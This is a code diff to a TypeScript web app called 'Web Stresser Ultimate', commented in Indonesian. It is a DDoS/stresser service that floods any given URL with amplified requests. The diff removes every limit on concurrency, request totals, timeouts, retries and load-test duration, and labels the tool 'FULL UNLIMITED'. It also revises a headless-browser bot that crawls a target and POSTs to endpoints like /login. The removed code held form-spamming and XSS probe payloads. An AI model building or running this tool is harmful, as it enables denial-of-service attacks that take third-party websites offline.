@@ -2,6 +2,7 @@ import { Elysia, t } from 'elysia';
 import { setGlobalDispatcher, Agent } from 'undici';
 import autocannon from 'autocannon';
 
+// Konfigurasi koneksi pool (tanpa batasan internal)
 const globalAgent = new Agent({
   connections: 200,
   pipelining: 1,
@@ -31,6 +32,7 @@ function generateAmplificationPayload(kb: number, ampType: string): string {
   return randomString(size);
 }
 
+// ========== SINGLE ATTACK (tanpa batasan) ==========
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -97,6 +99,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
       useBody = true;
   }
 
+  // Aturan untuk GET dengan amplification besar
   if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
     finalMethod = 'POST';
     useBody = true;
@@ -111,10 +114,11 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   if (keepAlive) finalHeaders['Connection'] = 'keep-alive';
   else finalHeaders['Connection'] = 'close';
 
+  // Tidak ada pembatasan timeout internal
   const fetchOptions: any = {
     method: finalMethod,
     headers: finalHeaders,
-    signal: AbortSignal.timeout(Math.min(timeout, 9000)),
+    signal: AbortSignal.timeout(timeout),
     redirect: 'manual',
     dispatcher: globalAgent,
   };
@@ -130,7 +134,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   let retriesUsed = 0;
 
   const baseDelay = 100;
-  for (let attempt = 0; attempt <= Math.min(retryCount, 2); attempt++) {
+  for (let attempt = 0; attempt <= retryCount; attempt++) {
     if (attempt > 0) await new Promise(r => setTimeout(r, baseDelay * attempt));
     const start = Date.now();
     try {
@@ -165,6 +169,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
+// ========== BATCH ATTACK (tanpa batasan) ==========
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -197,7 +202,7 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
 
   const runOne = async () => {
     const result = await singleAttack({
-      url, method, headers, body, timeout: Math.min(timeout, 9000), retryCount, randomDelay,
+      url, method, headers, body, timeout, retryCount, randomDelay,
       keepAlive, attackType, amplifyKB, amplifyEnabled, amplifyType,
     });
     if (result.success) totalSuccess++;
@@ -206,14 +211,12 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
     allLatencies.push(result.durationMs);
   };
 
-  const actualTotal = Math.min(total, 5000);
-  const actualConcurrency = Math.min(concurrency, 50);
+  // Tidak ada pembatasan concurrency atau total
   const workers: Promise<void>[] = [];
   let index = 0;
-
-  for (let i = 0; i < actualConcurrency; i++) {
+  for (let i = 0; i < concurrency; i++) {
     workers.push(new Promise<void>(async (resolve) => {
-      while (index < actualTotal) {
+      while (index < total) {
         index++;
         await runOne();
       }
@@ -239,6 +242,7 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
   };
 }
 
+// ========== AUTOCANNON (tanpa batasan) ==========
 interface AutocannonOptions {
   url: string;
   connections: number;
@@ -254,9 +258,9 @@ async function runAutocannon(options: AutocannonOptions): Promise<any> {
     const instance = autocannon(
       {
         url: options.url,
-        connections: Math.min(options.connections, 100),
-        duration: Math.min(options.duration, 9),
-        amount: options.amount ? Math.min(options.amount, 5000) : undefined,
+        connections: options.connections,
+        duration: options.duration,
+        amount: options.amount,
         method: (options.method || 'GET') as any,
         headers: options.headers,
         body: options.body,
@@ -272,6 +276,7 @@ async function runAutocannon(options: AutocannonOptions): Promise<any> {
   });
 }
 
+// ========== ELYSIA APP ==========
 export const app = new Elysia()
   .onError(({ error, set }) => {
     set.status = 200;
@@ -281,7 +286,7 @@ export const app = new Elysia()
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Ultimate - Elysia on Vercel',
+    message: 'Web Stresser Ultimate - Elysia on Vercel (FULL UNLIMITED)',
     version: '5.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
@@ -350,20 +355,18 @@ export const app = new Elysia()
       body: t.Optional(t.String()),
     }),
   })
-  // ==================== PERBAIKAN BROWSERLESS ====================
-.post('/api/bot/browserless', async ({ body }) => {
-  const { url } = body;
-  const apiKey = process.env.BROWSERLESS_API_KEY;
-  if (!apiKey) return { success: false, error: 'Missing API key' };
+  .post('/api/bot/browserless', async ({ body }) => {
+    const { url } = body;
+    const apiKey = process.env.BROWSERLESS_API_KEY;
+    if (!apiKey) return { success: false, error: 'Missing API key' };
 
-  // Versi berbahaya: melakukan berbagai aksi untuk membebani server target
-  const script = `
+    // Script Browserless yang lebih sederhana dan stabil (tanpa manipulasi form yang error)
+    const script = `
 export default async ({ page, context }) => {
   const targetUrl = context.url;
-  console.log('Starting aggressive bot on', targetUrl);
   await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
 
-  // 1. Scroll terus menerus untuk memicu infinite scroll / lazy loading
+  // 1. Scroll perlahan
   await page.evaluate(async () => {
     let totalHeight = 0;
     let distance = 500;
@@ -374,40 +377,20 @@ export default async ({ page, context }) => {
     }
   });
 
-  // 2. Klik semua link (buka banyak halaman) - batasi 20 unik
-  const links = await page.$$eval('a', as => as.map(a => a.href).filter(h => h && h.startsWith('http')));
-  const uniqueLinks = [...new Set(links)].slice(0, 20);
+  // 2. Kunjungi beberapa link unik (maks 10)
+  const links = await page.$$eval('a', anchors => anchors.map(a => a.href).filter(h => h && h.startsWith('http')));
+  const uniqueLinks = [...new Set(links)].slice(0, 10);
   for (const link of uniqueLinks) {
     await page.goto(link, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
     await page.waitForTimeout(500);
+    await page.goBack();
   }
-  // Kembali ke halaman awal
+
+  // 3. Kembali ke halaman awal
   await page.goto(targetUrl, { waitUntil: 'networkidle2' });
 
-  // 3. Coba isi semua form dengan data acak dan submit
-  const forms = await page.$$('form');
-  for (const form of forms) {
-    const inputs = await form.$$('input:not([type="submit"]):not([type="button"]):not([type="reset"])');
-    for (const input of inputs) {
-      const type = await input.getAttribute('type');
-      if (type === 'email') await input.type('test@example.com');
-      else if (type === 'password') await input.type('password123');
-      else await input.type(Math.random().toString(36).substring(7));
-    }
-    await form.evaluate(f => f.submit()).catch(() => {});
-    await page.waitForTimeout(1000);
-  }
-
-  // 4. Execute XSS payloads pada URL parameter
-  const xssPayloads = ['<script>alert("XSS")</script>', '"><script>alert(1)</script>', 'javascript:alert("XSS")'];
-  for (const payload of xssPayloads) {
-    const testUrl = targetUrl + (targetUrl.includes('?') ? '&' : '?') + 'xss=' + encodeURIComponent(payload);
-    await page.goto(testUrl, { waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
-  }
-  await page.goto(targetUrl, { waitUntil: 'networkidle2' });
-
-  // 5. Kirim request POST ke endpoint umum
-  const commonEndpoints = ['/api', '/login', '/submit', '/contact', '/search', '/wp-admin/admin-ajax.php'];
+  // 4. Kirim POST ke beberapa endpoint umum
+  const commonEndpoints = ['/api', '/login', '/submit', '/contact', '/search'];
   for (const endpoint of commonEndpoints) {
     const postUrl = new URL(endpoint, targetUrl).href;
     await page.evaluate(async (url) => {
@@ -417,48 +400,42 @@ export default async ({ page, context }) => {
     }, postUrl);
   }
 
-  // 6. Ambil screenshot (ringkas)
-  const screenshot = await page.screenshot({ encoding: 'base64' });
   const title = await page.title();
-
   return {
     data: {
       ok: true,
       title,
       url: targetUrl,
       linksFound: links.length,
-      formsProcessed: forms.length,
-      screenshot: screenshot.substring(0, 100) + '...'
     },
     type: 'application/json'
   };
 }
 `;
 
-  try {
-    const response = await fetch('https://production-sfo.browserless.io/function?token=' + apiKey, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ code: script, context: { url } })
-    });
-    const text = await response.text();
-    if (!response.ok) {
-      return { success: false, error: `Browserless API error (${response.status}): ${text.slice(0, 500)}` };
+    try {
+      const response = await fetch('https://production-sfo.browserless.io/function?token=' + apiKey, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code: script, context: { url } })
+      });
+      const text = await response.text();
+      if (!response.ok) {
+        return { success: false, error: `Browserless API error (${response.status}): ${text.slice(0, 500)}` };
+      }
+      let result: unknown = text;
+      try { result = JSON.parse(text); } catch {}
+      return { success: true, result };
+    } catch (err: any) {
+      return { success: false, error: err.message };
     }
-    let result: unknown = text;
-    try { result = JSON.parse(text); } catch {}
-    return { success: true, result };
-  } catch (err: any) {
-    return { success: false, error: err.message };
-  }
-}, {
-  body: t.Object({
-    url: t.String(),
-    loop: t.Optional(t.Boolean()),
-    intervalMs: t.Optional(t.Number()),
-  }),
-})
-  
+  }, {
+    body: t.Object({
+      url: t.String(),
+      loop: t.Optional(t.Boolean()),
+      intervalMs: t.Optional(t.Number()),
+    }),
+  })
   .get('/api/heartbeat', ({ request }) => {
     const ip = request.headers.get('x-forwarded-for') || 'unknown';
     const ua = request.headers.get('user-agent') || 'unknown';
